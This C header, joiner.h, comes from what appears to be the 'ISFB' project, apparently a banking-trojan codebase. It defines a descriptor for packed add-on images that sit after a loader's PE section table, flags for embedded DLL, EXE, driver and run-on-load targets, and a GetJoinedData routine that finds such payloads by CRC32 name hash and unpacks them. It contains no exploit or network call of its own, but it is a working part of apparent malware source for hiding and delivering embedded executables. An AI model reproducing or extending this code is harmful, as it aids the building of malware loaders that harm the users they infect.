//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: joiner.h
// $Revision: 92 $
// $Date: 2013-08-13 13:30:59 +0400 (Вт, 13 авг 2013) $
// description: 
//	Support for joined files.

#pragma once

#define		ADDON_MAGIC			'JF'

typedef struct	_ADDON_DESCRIPTOR
{
	USHORT	Magic;			//	ADDON_MAGIC	value
	USHORT	NumberHashes;	//	number of name hashes in the Hash array
	ULONG	ImageRva;		//  RVA of the packed image
	ULONG	ImageSize;		//  size of the packed image
	ULONG	ImageId;		//	any ID of the packed image (typicaly image name CRC32 hash)
	ULONG	Flags;			//  addon flags
	ULONG	Hash[0];
} ADDON_DESCRIPTOR, *PADDON_DESCRIPTOR;


// Pe state and structure flags
#define	PE_FLAG_VALID		1
#define	PE_FLAG_NATIVE		2
#define	PE_FLAG_DLL			4
#define	PE_FLAG_X64			8
#define	PE_FLAG_CSUM		0x10

#define TARGET_FLAG_BINARY		0x100
#define	TARGET_FLAG_DLL			0x200
#define	TARGET_FLAG_EXE			0x400
#define	TARGET_FLAG_DRV			0x800
#define	TARGET_FLAG_RUN			0x1000
#define	TARGET_FLAG_INI			0x2000
#define	TARGET_FLAG_PACKED		0x10000


_inline	PADDON_DESCRIPTOR	FirstAddonDescriptor(PVOID	ImageBase)
{
	PIMAGE_NT_HEADERS		Pe = (PIMAGE_NT_HEADERS)((PCHAR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew);
	PIMAGE_SECTION_HEADER	Section = IMAGE_FIRST_SECTION(Pe);

	return((PADDON_DESCRIPTOR)(Section + Pe->FileHeader.NumberOfSections + 1));
}

#define		NextAddonDescriptor(x)	(PADDON_DESCRIPTOR)((PCHAR)x + sizeof(ADDON_DESCRIPTOR) + x->NumberHashes * sizeof(ULONG))

PVOID	GetCurrentImageBase(VOID);
VOID	InitializeAddons(VOID);


//
//	Searches for the joined data within the specified module.
//	If found, allocated a memory buffer and copies the data into it. If the data packed - unpacks it.
//	In case of success (the data found and copied) returns TRUE, otherwise returns FALSE.
//
BOOL	GetJoinedData(
	PIMAGE_DOS_HEADER	LoaderBase,	// Base of a module containing joined data
	PCHAR*				pBuffer,	// Pointer to a variable which receives pointer to a buffer containing joined data
	PULONG				pSize,		// Pointer to a variable which receives size of the buffer
	BOOL				Is64Bit,	// TRUE if 64-bit resource requested
	ULONG				NameHash,	// CRC32 hash of the name of the joined data file
	ULONG				TypeFlags	// Type of the joined data
	);